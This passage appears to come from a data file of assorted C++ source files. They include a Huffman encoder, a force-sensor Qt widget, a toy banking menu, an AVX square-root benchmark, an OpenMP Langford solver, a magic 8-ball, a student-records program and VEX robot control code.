and creating a new internal node with sum of their frequencies\r\n    while (pq.size() > 1) {\r\n        Node* left = pq.top();\r\n        pq.pop();\r\n        Node* right = pq.top();\r\n        pq.pop();\r\n\r\n        Node* internalNode = new Node('$', left->freq + right->freq);\r\n        internalNode->left = left;\r\n        internalNode->right = right;\r\n\r\n        pq.push(internalNode);\r\n    }\r\n\r\n    // Step 5: Root of Huffman tree is stored in pq.top()\r\n    Node* root = pq.top();\r\n\r\n    // Step 6: Generate Huffman codes and print them\r\n    cout << \"Huffman Codes:\" << endl;\r\n    printCodes(root, \"\", huffmanCodes);\r\n\r\n    // Step 7: Encode the input text using Huffman codes\r\n    string encodedText = \"\";\r\n    for (char c : text) {\r\n        encodedText += huffmanCodes[c];\r\n    }\r\n\r\n    // Step 8: Clean up memory by deleting nodes\r\n    delete root;\r\n\r\n    return encodedText;\r\n}\r\n\r\nint main() {\r\n    string text;\r\n    cout << \"Enter text to encode using Huffman coding: \";\r\n    getline(cin, text);\r\n\r\n    unordered_map<char, string> huffmanCodes;\r\n    string encodedText = buildHuffmanTree(text, huffmanCodes);\r\n\r\n    cout << \"\\nEncoded text: \" << encodedText << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"ATI_force_sensor.h\"\r\n\r\n\r\n\r\n\r\nATI_force_sensor::ATI_force_sensor(QWidget *parent, QString calibration_filepath_in, QString sensor_name_in):\r\nQWidget(parent)\r\n{\r\n    calibration_filepath = calibration_filepath_in;\r\n\tsensor_name = sensor_name_in;\r\n\r\n\t/////////////////////////background_box must be the first GUI object so that it doesn't cover over other objects!!!\r\n\tbackground_box = new QLabel(\"\",this);\r\n\tbackground_box->setGeometry(0,0,1280,380);\r\n\tbackground_box->setStyleSheet(\"*{border: 1px solid  #09A72E; border-radius: 10px;background-color: rgb(rgb(200,255,200))}\");\r\n\r\n    ATI_FT_raw = std::vector<double>(6,0);\r\n\r\n\tBias_being_computed_block_flag = 0;\r\n\tATI_FT_raw_BiasVoltage_queue_vec = std::vector<std::queue<double>>(6, std::queue<double>());\r\n\r\n    ATI_FT_smoothed = std::vector<double>(6,0);\r\n    ATI_FT_dot = std::vector<double>(6,0);\r\n\tATI_Force3Vec_only_smoothed = std::vector<double>(3,0);\r\n\r\n\tforce_sensor_has_been_biased_at_startup_flag = 0;\r\n\r\n    plot_mutex = new QMutex;\r\n\tbias_being_computed_mutex = new QMutex;\r\n\r\n    int plot_height = 175;\r\n\tint plot_height_inc = 10;\r\n    int plot_width = 370;\r\n\tint plot_width_inc = 10;\r\n\tint plot_start_x = 5;\r\n\tint plot_start_y = 5;\r\n\r\n    std::vector<double *> temp_0;\r\n    temp_0.push_back(&ATI_FT_raw[0]);\r\n    temp_0.push_back(&ATI_FT_smoothed[0]);\r\n    plot_data_vec.push_back(temp_0);\r\n    plot.push_back(new DataPlot(plot_data_vec[0], 1, -8.0, 8.0, plot_height, QString(\"Fx (N)\"), \"N\", 0, this, plot_mutex));\r\n    plot[0]->setGeometry(QRect(plot_start_x + 0*(plot_width + plot_width_inc), plot_start_y + 0*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n    std::vector<double *> temp_1;\r\n    temp_1.push_back(&ATI_FT_raw[1]);\r\n    temp_1.push_back(&ATI_FT_smoothed[1]);\r\n    plot_data_vec.push_back(temp_1);\r\n    plot.push_back(new DataPlot(plot_data_vec[1], 1, -8.0, 8.0, plot_height, QString(\"Fy (N)\"), \"N\", 0, this, plot_mutex));\r\n    plot[1]->setGeometry(QRect(plot_start_x + 1*(plot_width + plot_width_inc), plot_start_y + 0*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n    std::vector<double *> temp_2;\r\n    temp_2.push_back(&ATI_FT_raw[2]);\r\n    temp_2.push_back(&ATI_FT_smoothed[2]);\r\n    plot_data_vec.push_back(temp_2);\r\n    plot.push_back(new DataPlot(plot_data_vec[2], 1, -15.0, 0.0, plot_height, QString(\"Fz (N)\"), \"N\", 0, this, plot_mutex));\r\n    plot[2]->setGeometry(QRect(plot_start_x + 2*(plot_width + plot_width_inc), plot_start_y + 0*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n\tstd::vector<double *> temp_3;\r\n    temp_3.push_back(&ATI_FT_raw[3]);\r\n    temp_3.push_back(&ATI_FT_smoothed[3]);\r\n    plot_data_vec.push_back(temp_3);\r\n    plot.push_back(new DataPlot(plot_data_vec[3], 1, -8.0, 8.0, plot_height, QString(\"Tx (NM)\"), \"NM\", 0, this, plot_mutex));\r\n    plot[3]->setGeometry(QRect(plot_start_x + 0*(plot_width + plot_width_inc), plot_start_y + 1*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n    std::vector<double *> temp_4;\r\n    temp_4.push_back(&ATI_FT_raw[4]);\r\n    temp_4.push_back(&ATI_FT_smoothed[4]);\r\n    plot_data_vec.push_back(temp_4);\r\n    plot.push_back(new DataPlot(plot_data_vec[4], 1, -8.0, 8.0, plot_height, QString(\"Ty (NM)\"), \"NM\", 0, this, plot_mutex));\r\n    plot[4]->setGeometry(QRect(plot_start_x + 1*(plot_width + plot_width_inc), plot_start_y + 1*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n    std::vector<double *> temp_5;\r\n    temp_5.push_back(&ATI_FT_raw[5]);\r\n    temp_5.push_back(&ATI_FT_smoothed[5]);\r\n    plot_data_vec.push_back(temp_5);\r\n    plot.push_back(new DataPlot(plot_data_vec[5], 1, -15.0, 0.0, plot_height, QString(\"Tz (NM)\"), \"NM\", 0, this, plot_mutex));\r\n    plot[5]->setGeometry(QRect(plot_start_x + 2*(plot_width + plot_width_inc), plot_start_y + 1*(plot_height + plot_height_inc), plot_width, plot_height));\r\n\r\n    sensor_name_label = new QLabel(sensor_name, this);\r\n    sensor_name_label->setGeometry(QRect(plot_start_x + 3*(plot_width + plot_width_inc),5, 200, 20));\r\n\r\n    biasVoltageButton = new QPushButton(\"Bias Voltage\", this);\r\n    QRect pos_biasVoltageButton = QRect(plot_start_x + 3*(plot_width + plot_width_inc),35,120,20);\r\n    biasVoltageButton->setGeometry(pos_biasVoltageButton);\r\n    connect(biasVoltageButton, SIGNAL(clicked()), this, SLOT(BiasVoltage()));\r\n\r\n    load_calibration(0);\r\n\r\n    SetForceUnits(cal,\"N\"); // Set force units.\r\n    SetTorqueUnits(cal,\"N-m\"); // Set torque units.\r\n\r\n\t////////////////////////////////////////////////////Zero these variables to eliminate incorrect starting blips in the data.\r\n\tfor(int i = 0; i < bessel_order+1; i++)\r\n\t{\r\n\t\tfor(int j = 0; j < 6; j++)\r\n\t\t{\r\n\t\t\tFT_raw[i][j] = 0; \r\n\t\t\tFT_filtered[i][j] = 0; \r\n\t\t}\r\n\t}\r\n\t////////////////////////////////////////////////////\r\n}\r\n\r\n\r\nvoid ATI_force_sensor::update(std::vector<double> raw_DAQ_voltages)\r\n{\r\n\tbias_being_computed_mutex->lock();\r\n    float voltages[6] = {0.0, 0.0, 0.0, 0.0, 0.0, 0.0};\r\n    float lambda_FT_dot = 1/(1+100*2*pi_define*(1/p",
    "#include <iostream>\r\n\r\nusing namespace std;\r\nstring username = \"nonjabulo\";\r\nstring pin = \"5432\";\r\nstring user;\r\nstring password;\r\n    int deposit;\r\n    int withdraw;\r\n    int balance;\r\n    int reportStolenCard;\r\n    int transferMoney;\r\n    float balance1 = 29765.43;\r\n    float withdraw1 = 45676.90;\r\n    double nb = 5000.89;\r\n    int sum = deposit+ nb;\r\n    int accountNumber;\r\n    int accountNo;\r\n    int choice;\r\n\r\n\r\nint main()\r\n{\r\n  cout<<\"WELCOME TO NONJABULO'S BANK\"<<endl;\r\n    while(true){\r\n    cout<<\"Enter username \"<<endl;\r\n    cin>>user;\r\n    cout<<\"Enter Account number: \"<<endl;\r\n    cin>>accountNumber;\r\n    cout<<\"Enter password \"<<endl;\r\n    cin>>password;\r\n   if(user== username && password== pin)\r\n    {\r\n        cout<<\"login successful \"<<endl;\r\n\r\n    }\r\n    else if(user!= username && password!= pin)\r\n            cout<<\"wrong details\"<<endl;\r\n            break;\r\n\r\n    }\r\n  cout<<\"Welcome to our banking menu: \"<<endl;\r\n    cout<<\"Enter 1 to Deposit\"<<endl;\r\n    cout<<\"Enter 2 to Withdraw\"<<endl;\r\n    cout<<\"Enter 3 to Check Balance\"<<endl;\r\n    cout<<\"Enter 4 to Report Stolen Card\"<<endl;\r\n    cout<<\"Enter 5 to Transfer Money\"<<endl;\r\n    cin>>choice;\r\n    switch(choice)\r\n\r\n    {\r\n    case 1:\r\n        cout<<\"Enter username: \";\r\n        cin>>user;\r\n        cout<<\"Enter password: \";\r\n        cin>>password;\r\n        cout<<\"How much would you like to deposit \";\r\n        cin>>deposit;\r\n        cout<<\"you have successfully deposited R\"<<deposit<<\"into your bank account\"<<endl;\r\n\r\n    case 2:\r\n         cout<<\"Enter username: \";\r\n        cin>>user;\r\n        cout<<\"Enter password: \";\r\n        cin>>password;\r\n        cout<<\"How much would you like to withdraw \";\r\n        cin>>withdraw;\r\n        cout<<\"your withdrawal of R\"<<withdraw<<\"was successfully  your new balance is R 377798 \"<<endl;\r\n\r\n    case 3:\r\n        cout<<\"Enter username: \";\r\n        cin>>user;\r\n        cout<<\"Enter password: \";\r\n        cin>>password;\r\n        cout<<\"check your balance \";\r\n        cin>>balance;\r\n        cout<<\"you have R\"<<balance;\r\n\r\n    case 4:\r\n         cout<<\"Enter username: \";\r\n        cin>>user;\r\n        cout<<\"Enter password: \";\r\n        cin>>password;\r\n        cout<<\"would you like the report the stolen card \";\r\n        cin>>reportStolenCard;\r\n        cout<<\"the stolen card has been successfully reported\"<<endl;\r\n\r\n    case 5:\r\n      cout<<\"Enter username: \";\r\n        cin>>user;\r\n        cout<<\"Enter password: \";\r\n        cin>>password;\r\n        cout<<\"Enter account number you would like to transfer money to\";\r\n        cin>>accountNo;\r\n        cout<<\"you have successfully transfered money to\"<<accountNumber;\r\n    default:\r\n        cout<<\"out of bound\";\r\n\r\n   }\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <cmath>         \n#include <immintrin.h>  \n#include <chrono>       \n#include <random>        \n#include <complex>\n\nconst size_t ARRAY_SIZE = 4096 * 4096;\n\nfloat sum_sqrt_float(const float* y, size_t n) {\n    float sum = 0.0f;\n    for (size_t i = 0; i < n; ++i) {\n        sum += std::sqrt(y[i]);  // x[i] = sqrt(y[i])\n    }\n    return sum;\n}\n\nfloat sum_sqrt_float_simd(const float* y, size_t n) {\n    float sum = 0.0f;\n\n    for (size_t i = 0; i < n; i += 8) {\n        __m256 data = _mm256_loadu_ps(&y[i]);\n        __m256 sqrt_data = _mm256_sqrt_ps(data);\n\n        float result[8];\n        _mm256_storeu_ps(result, sqrt_data);\n\n        for (int j = 0; j < 8; ++j) {\n            sum += result[j];\n        }\n    }\n\n    return sum;\n}\n\n\ndouble sum_sqrt_double(const double* y, size_t n) {\n    double sum = 0.0;\n    for (size_t i = 0; i < n; ++i) {\n        sum += std::sqrt(y[i]);\n    }\n    return sum;\n}\n\ndouble sum_sqrt_double_simd(const double* y, size_t n) {\n    __m256d simd_sum = _mm256_setzero_pd();\n\n    for (size_t i = 0; i < n; i += 4) {\n        __m256d data = _mm256_loadu_pd(&y[i]);\n        __m256d sqrt_data = _mm256_sqrt_pd(data);\n        simd_sum = _mm256_add_pd(simd_sum, sqrt_data);\n    }\n\n    double result[4];\n    _mm256_storeu_pd(result, simd_sum);\n\n    double sum = 0.0;\n    for (int i = 0; i < 4; ++i) {\n        sum += result[i];\n    }\n    return sum;\n}\n\ntemplate <typename T>\nvoid generate_random_array(T* arr, size_t n) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_real_distribution<T> dist(1.0, 100.0);\n\n    for (size_t i = 0; i < n; ++i) {\n        arr[i] = dist(gen);\n    }\n}\n\ntemplate <typename Func>\nvoid measure_execution_time(const std::string& name, Func func) {\n    auto start = std::chrono::high_resolution_clock::now();\n    func();\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> duration = end - start;\n    std::cout << name << \" took \" << duration.count() << \" seconds.\\n\";\n}\n\nvoid task6() {\n    float* float_data = new float[ARRAY_SIZE];\n    double* double_data = new double[ARRAY_SIZE];\n\n    generate_random_array(float_data, ARRAY_SIZE);\n    generate_random_array(double_data, ARRAY_SIZE);\n\n    measure_execution_time(\"Regular sum of square roots (float)\", [&]() {\n        float sum = sum_sqrt_float(float_data, ARRAY_SIZE);\n        std::cout << \"Sum (regular float): \" << sum << std::endl;\n        });\n\n    measure_execution_time(\"SIMD sum of square roots (float)\", [&]() {\n        float simd_sum = sum_sqrt_float_simd(float_data, ARRAY_SIZE);\n        std::cout << \"Sum (SIMD float): \" << simd_sum << std::endl;\n        });\n\n    measure_execution_time(\"Regular sum of square roots (double)\", [&]() {\n        double sum = sum_sqrt_double(double_data, ARRAY_SIZE);\n        std::cout << \"Sum (regular double): \" << sum << std::endl;\n        });\n\n    measure_execution_time(\"SIMD sum of square roots (double)\", [&]() {\n        double simd_sum = sum_sqrt_double_simd(double_data, ARRAY_SIZE);\n        std::cout << \"Sum (SIMD double): \" << simd_sum << std::endl;\n        });\n\n    delete[] float_data;\n    delete[] double_data;\n}\n\nvoid multiply_complex_no_simd(const std::complex<float>* y,\n    const std::complex<float>* z,\n    std::complex<float>* x, size_t n) {\n    for (size_t i = 0; i < n; ++i) {\n        x[i] = y[i] * z[i];  // \u00d1\u00f2\u00e0\u00ed\u00e4\u00e0\u00f0\u00f2\u00ed\u00e5 \u00ea\u00ee\u00ec\u00ef\u00eb\u00e5\u00ea\u00f1\u00ed\u00e5 \u00ec\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff\n    }\n}\n\n// \u00d4\u00f3\u00ed\u00ea\u00f6\u00b3\u00ff \u00e7 \u00e2\u00e8\u00ea\u00ee\u00f0\u00e8\u00f1\u00f2\u00e0\u00ed\u00ed\u00ff\u00ec SIMD (AVX)\nvoid multiply_complex_simd(const float* y, const float* z, float* x, size_t n) {\n    for (size_t i = 0; i < n * 2; i += 8) {  // \u00ce\u00e1\u00f0\u00ee\u00e1\u00ea\u00e0 8 float \u00ee\u00e4\u00ed\u00ee\u00f7\u00e0\u00f1\u00ed\u00ee\n        __m256 y_vals = _mm256_loadu_ps(&y[i]);\n        __m256 z_vals = _mm256_loadu_ps(&z[i]);\n        __m256 result = _mm256_mul_ps(y_vals, z_vals);  // SIMD-\u00ec\u00ed\u00ee\u00e6\u00e5\u00ed\u00ed\u00ff\n        _mm256_storeu_ps(&x[i], result);\n    }\n}\n\ntemplate <typename T>\nvoid generate_random_complex(T* arr, size_t n) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_real_distribution<float> dist(1.0f, 10.0f);\n\n    for (size_t i = 0; i < n; ++i) {\n        arr[i] = { dist(gen), dist(gen) };\n    }\n}\n\nvoid task8() {\n    auto n = ARRAY_SIZE / 2;  // \u00ca\u00b3\u00eb\u00fc\u00ea\u00b3\u00f1\u00f2\u00fc \u00ea\u00ee\u00ec\u00ef\u00eb\u00e5\u00ea\u00f1\u00ed\u00e8\u00f5 \u00f7\u00e8\u00f1\u00e5\u00eb\n\n    // \u00c2\u00e8\u00e4\u00b3\u00eb\u00e5\u00ed\u00ed\u00ff \u00ef\u00e0\u00ec'\u00ff\u00f2\u00b3 \u00e4\u00eb\u00ff \u00ec\u00e0\u00f1\u00e8\u00e2\u00b3\u00e2\n    std::complex<float>* y = new std::complex<float>[n];\n    std::complex<float>* z = new std::complex<float>[n];\n    std::complex<float>* x_no_simd = new std::complex<float>[n];\n    float* y_flat = new float[n * 2];  // \u00cf\u00eb\u00e0\u00f1\u00ea\u00e8\u00e9 \u00ec\u00e0\u00f1\u00e8\u00e2 \u00e4\u00eb\u00ff SIMD\n    float* z_flat = new float[n * 2];\n    float* x_simd = new float[n * 2];\n\n    generate_random_complex(y, n);\n    generate_random_complex(z, n);\n\n    auto start = std::chrono::high_resolution_clock::now();\n    multiply_complex_no_simd(y, z, x_no_simd, n);\n    auto end = std::chrono::high_resolution_clock::now();\n    std::chrono::duration<double> duration = end - start;\n    std::cout << \"Without SIMD: \" << duration.count() << \" seconds\\n\";\n\n    // \u00ca\u00ee\u00ed\u00e2\u00e5\u00f0\u00f2\u00e0\u00f6\u00b3\u00ff \u00ea\u00ee\u00ec\u00ef\u00eb\u00e5\u00ea\u00f1\u00ed\u00e8\u00f5 \u00f7\u00e8\u00f1\u00e5\u00eb \u00f3 \u00ef\u00eb\u00e0\u00f1\u00ea\u00b3 \u00ec\u00e0\u00f1\u00e8\u00e2\u00e8\n    for (size_t i = 0; i < n; ++i) {\n        y_flat[2 ",
    "#include <iostream>\n#include <omp.h>\n#include <time.h>\n#include <unordered_set>\n#include <vector>\n\n#define N 15\n#define DEPTH 1\n\n// G\u00e9n\u00e8re le tableau des positions maximales\ninline std::vector<int> generateMaxPosTab(int n) {\n  std::vector<int> max_pos_tab(n);\n  int max_pos = 2 * n - 2;\n\n  for (int i = 0; i < n; i++) {\n    max_pos_tab[i] = max_pos--;\n  }\n\n  if (n % 2 == 0) {\n    max_pos_tab[n - 2] /= 2;\n  } else {\n    max_pos_tab[n - 1] /= 2;\n  }\n\n  return max_pos_tab;\n}\n\n// G\u00e9n\u00e8re les combinaisons possibles jusqu'\u00e0 une profondeur donn\u00e9e et les stocke\nvoid generateCombinations(int depth, const std::vector<int> &max_pos_tab,\n                          int &count,\n                          std::vector<std::vector<int>> &solutions) {\n  std::vector<int> indices(depth, 1);\n\n  while (true) {\n    std::unordered_set<int> uniqueValues(indices.begin(), indices.end());\n    bool isValid = ((int)uniqueValues.size() == depth);\n    bool isValid2 = true;\n\n    for (int i = 0; i < depth && isValid; ++i) {\n      if (indices[i] > max_pos_tab[N - depth + i]) {\n        isValid = false;\n        break;\n      }\n    }\n\n    if (isValid) {\n      std::vector<int> general_tab(2 * N, 0);\n      for (int i = N - DEPTH; i < N; ++i) {\n        if (general_tab[indices[i - (N - DEPTH)] - 1] == 0 &&\n            general_tab[indices[i - (N - DEPTH)] + i + 1] == 0) {\n          general_tab[indices[i - (N - DEPTH)] - 1] = i + 1;\n          general_tab[indices[i - (N - DEPTH)] + i + 1] = i + 1;\n        } else {\n          isValid2 = false;\n          break;\n        }\n      }\n    }\n\n    if (isValid && isValid2) {\n      std::vector<int> solution(N, 0);\n      for (int i = 0; i < depth; ++i) {\n        solution[N - depth + i] = indices[i];\n      }\n\n#pragma omp critical\n      {\n        solutions.push_back(solution);\n        count++;\n      }\n    }\n\n    int position = depth - 1;\n    while (position >= 0) {\n      int maxVal = 2 * N - 2 - (N - depth + position);\n      if (indices[position] < maxVal) {\n        indices[position]++;\n        break;\n      } else {\n        indices[position] = 1;\n        position--;\n      }\n    }\n\n    if (position < 0)\n      break;\n  }\n}\n\ninline void remove_pair(std::vector<int> &langford,\n                        std::vector<int> &general_tab, int pair) {\n  general_tab[langford[pair - 1] - 1] = 0;\n  general_tab[langford[pair - 1] + pair] = 0;\n  langford[pair - 1] = 0;\n}\n\ninline int place_pair(std::vector<int> &langford,\n                      const std::vector<int> &max_pos_tab,\n                      std::vector<int> &general_tab, int pair) {\n  int i = (langford[pair - 1] != 0) ? langford[pair - 1] + 1 : 1;\n\n  if (langford[pair - 1] != 0) {\n    remove_pair(langford, general_tab, pair);\n  }\n\n  for (; i <= max_pos_tab[pair - 1]; i++) {\n    int second_pos = i + pair;\n    if (general_tab[i - 1] == 0 && general_tab[second_pos] == 0) {\n      general_tab[i - 1] = pair;\n      general_tab[second_pos] = pair;\n      langford[pair - 1] = i;\n      return 1;\n    }\n  }\n\n  return 0;\n}\n\nvoid init_general_tab(std::vector<int> &langford,\n                      std::vector<int> &general_tab) {\n  for (int i = N - DEPTH; i < N; i++) {\n    general_tab[langford[i] - 1] = i + 1;\n    general_tab[langford[i] + i + 1] = i + 1;\n  }\n}\n\nvoid langford_algorithm(std::vector<int> &langford,\n                        const std::vector<int> &max_pos_tab, int &local_count) {\n  int level = N - DEPTH;\n  std::vector<int> general_tab(2 * N, 0);\n  init_general_tab(langford, general_tab);\n\n  while (level <= N - DEPTH) {\n    if (place_pair(langford, max_pos_tab, general_tab, level)) {\n      if (level == 1) {\n        local_count++; // Incr\u00e9mentation de la variable locale\n        remove_pair(langford, general_tab, 1);\n      } else {\n        level--;\n        continue;\n      }\n    }\n    level++;\n  }\n}\n\nint main() {\n  int count = 0;\n  int total_count2 = 0;\n  std::vector<int> max_pos_tab = generateMaxPosTab(N);\n  std::vector<std::vector<int>> solutions;\n\n  double start_time, end_time;\n#ifdef _OPENMP\n  start_time = omp_get_wtime();\n#else\n  start_time = clock();\n#endif\n\n  generateCombinations(DEPTH, max_pos_tab, count, solutions);\n\n#pragma omp parallel for reduction(+ : total_count2)\n  for (size_t i = 0; i < solutions.size(); i++) {\n    int local_count = 0; // Variable locale pour chaque thread\n    langford_algorithm(solutions[i], max_pos_tab, local_count);\n    total_count2 += local_count; // Additionne local_count au compteur global\n  }\n\n#ifdef _OPENMP\n  end_time = omp_get_wtime();\n  printf(\"Time : %lf seconds (parallel)\\n\", end_time - start_time);\n#else\n  end_time = clock();\n  printf(\"Time : %lf seconds (sequential)\\n\",\n         (end_time - start_time) / CLOCKS_PER_SEC);\n#endif\n\n  std::cout << \"N: \" << N << std::endl;\n  std::cout << \"DEPTH: \" << DEPTH << std::endl;\n  std::cout << \"Nombre total de t\u00e2ches: \" << count << std::endl;\n  std::cout << \"Nombre total de solutions: \" << total_count2 << std::endl;\n\n  return 0;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n\nint main() {\n  std::cout << \"MAGIC 8-BALL: \";\n  srand(time(NULL));\n  int answer = std::rand() % 20;\n\n  if(answer == 0) {\n    std::cout << \"It is absolute.\";\n  }\n  else if(answer == 1) {\n    std::cout << \"It is certain.\";\n  }\n  else if(answer == 2) {\n    std::cout << \"It is very certain.\";\n  }\n  else if(answer == 3) {\n    std::cout << \"It is somewhat certain.\";\n  }\n  else if(answer == 4) {\n    std::cout << \"It is not-so certain.\";\n  }\n  else if(answer == 5) {\n    std::cout << \"It is very sure.\";\n  }\n  else if(answer == 6) {\n    std::cout << \"It is sure.\";\n  }\n  else if(answer == 7) {\n    std::cout << \"It is unsure.\";\n  }\n  else if(answer == 8) {\n    std::cout << \"It is very unsure.\";\n  }\n  else if(answer == 9) {\n    std::cout << \"It could be.\";\n  }\n  else if(answer == 10) {\n    std::cout << \"You never know.\";\n  }\n  else if(answer == 11) {\n    std::cout << \"Yes, 100%.\";\n  }\n  else if(answer == 12) {\n    std::cout << \"Sorry, No.\";\n  }\n  else if(answer == 13) {\n    std::cout << \"Maybe?\";\n  }\n  else if(answer == 14) {\n    std::cout << \"Maybe, yes?\";\n  }\n  else if(answer == 15) {\n    std::cout << \"Maybe, no?\";\n  }\n  else if(answer == 16) {\n    std::cout << \"It doubts it.\";\n  }\n  else if(answer == 17) {\n    std::cout << \"Very unlikely.\";\n  }\n  else if(answer == 18) {\n    std::cout << \"Very likely.\";\n  }\n  else if(answer == 19) {\n    std::cout << \"Doubtful.\";\n  }\n  else if(answer == 20) {\n    std::cout << \"Very doubtful.\";\n  }\n\n  return 0;\n}",
    "#include <StudentRecord.h>\n#include <helper_functions.h>\n#include <types.h>\n\n#include <iostream>\n\n/**\n * @brief The main entry point of the student records program.\n *\n * This function manages the input and output of student course records.\n * It prompts the user to enter a student name and then allows the user\n * to continuously input course information (course name and grade).\n * The user can exit the input loop and print the records at any time.\n *\n * @param argc The number of command-line arguments.\n * @param argv An array of command-line argument strings.\n * @return An integer indicating the exit status of the program.\n */\nint main(int argc, char **argv) {\n  StudentRecord student_rec;  ///< Object to hold student records.\n  std::string name;           ///< Variable to store the student's name.\n  char exit{};  ///< Variable to determine if the user wants to exit.\n\n  TERMINAL_WIDTHS term;  ///< Variable to hold the terminal width category.\n\n  std::cout << \"Enter Student Name: \";\n  std::cin >> name;\n\n  std::cout << \"Welcome to \" << name << \" records!\" << std::endl;\n\n  /**\n   * The main loop\n   */\n  for (;;) {\n    std::cout << \"Please enter course information: \" << std::endl\n              << \"Course Name  Course Grade (0.0 form)\" << std::endl;\n\n    std::cin >> student_rec;  ///< Input course name and grade into student_rec.\n\n    std::cout << \"Enter another class? [y/n]: \";\n    std::cin >> exit;  ///< Ask the user if they want to exit.\n\n    if (exit == 'n' || exit == 'N') {\n      break;  ///< Exit the loop if the user confirms.\n    }\n  }\n\n  student_rec.print_records();  ///< Print all student records at the end.\n}\n",
    "/*----------------------------------------------------------------------------*/\n/*                                                                            */\n/*    Module:       main.cpp                                                  */\n/*    Author:       Theron Tyler                                              */\n/*    Created:      9/20/2024, 8:15:00 AM                                     */\n/*    Description:  V5 project                                                */\n/*                                                                            */\n/*----------------------------------------------------------------------------*/\n\n#include \"setup.h\"\n//#include \"turnHeading.h\"\n\nusing namespace vex;\n\n// A global instance of competition\nvoid pre_auton(void) {\n\n//Speed\nintake.setVelocity(95,pct);\n\n//Stopping\nmotor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setStopping(brake);\nintake.setStopping(coast);\n}\n\nvoid load(){\n  intake.spin(fwd);\n  ai.takeSnapshot(aivision::ALL_COLORS);\n  if(ai.objectCount){\n    bPack.stop();\n    }\n  else{\n    bPack.spinTo(5, deg);\n  }\n}\n\nvoid mind(char cmd,float delay,float revolutions) {\n  switch (cmd) {\n  case 'w': //forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(60, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 's': //slow forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(35, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'S': //super slow forward motion\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(15, pct);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'a': //clockwise turn\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(70, pct);\n    motor_group(fLDrive, bLDrive, mLDrive ).spinFor(fwd, revolutions, rev, false);\n    motor_group(fRDrive, bRDrive, mRDrive).spinFor(reverse, revolutions, rev, false);\n    wait(delay, sec);\n    motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).stop();\n    break;\n  case 'i': //intake\n    intake.setVelocity(100,pct);\n    intake.spinFor(fwd, revolutions, rev, false);\n    wait(delay, sec);\n    intake.stop();\n    break;\n  }\n}\n/* ---- Possible New Auton Functions\nvoid drive(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(speed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).spinFor(fwd, revolutions, rev);\n}\n\nvoid turnLeft(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(speed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive ).spinFor(reverse, revolutions, rev, false);\n  motor_group(fRDrive, bRDrive, mLDrive).spinFor(fwd, revolutions, rev, false);\n}\n\nvoid turnRight(float revolutions, float speed){\n  motor_group(fLDrive, bLDrive, mLDrive, fRDrive, bRDrive, mRDrive).setVelocity(soeed, pct);\n  motor_group(fLDrive, bLDrive, mLDrive ).spinFor(fwd, revolutions, rev, false);\n  motor_group(fRDrive, bRDrive, mLDrive).spinFor(reverse, revolutions, rev, false);\n}\n*/\n\nvoid autonomous(void) {\nmind('w',.75,-1.55); //Rush goal\nwait(25, msec);\nmoGo.set(true);\n\nmind('i',1,2.5); //score preload\n\nmind('a',.7,-.2); //first stack\nintake.spinFor(fwd,40,rev,false);\nmind('w',.5,.85);\nmind('s',.25,.4);\n\nwait(1, sec);\nmind('S',.25,1);\nmind('a',1.5,-.5);//second stack\nmind('s',.4,.9);\n\nmind('a',.25,.3);\nmind('s',.2,.25);\n\nmind('s',1.5,-3.3);//retreat to ladder\n}\n\nvoid usercontrol(void) {\nwhile (1) {\n  //Drive\n  int rotational = Controller.Axis3.position(pct);\n  int lateral = Controller.Axis1.position(pct);\n\n  motor_group(fLDrive, bLDrive, mLDrive).spin(fwd,lateral + rotational,pct);\n  motor_group(fRDrive, bRDrive, mRDrive).spin(reverse,lateral - rotational,pct);\n  \n  //Intake\n  if (Controller.ButtonL1.pressing()) {\n    intake.spin(fwd, 80, pct);\n  }\n  else if (Controller.ButtonL2.pressing()) {\n    intake.spin(reverse, 80, pct);\n  }\n  else {\n    intake.stop();\n  }\n\n  //Moble Goal\n  if (Controller.ButtonB.pressing()) {\n    moGo.set(true);\n  }\n  else if (Controller.ButtonDown.pressing()) {\n    moGo.set(false);\n  }\n\n  //Doinker\n  if (Controller.ButtonLeft.pressing()) {\n    doinker.set(true);\n  }\n  else if (Controller.ButtonUp.pressing()) {\n    doinker.set(false);\n  }\n\n  //Arm\n  if (Controller.ButtonR1.pressing()) {\n    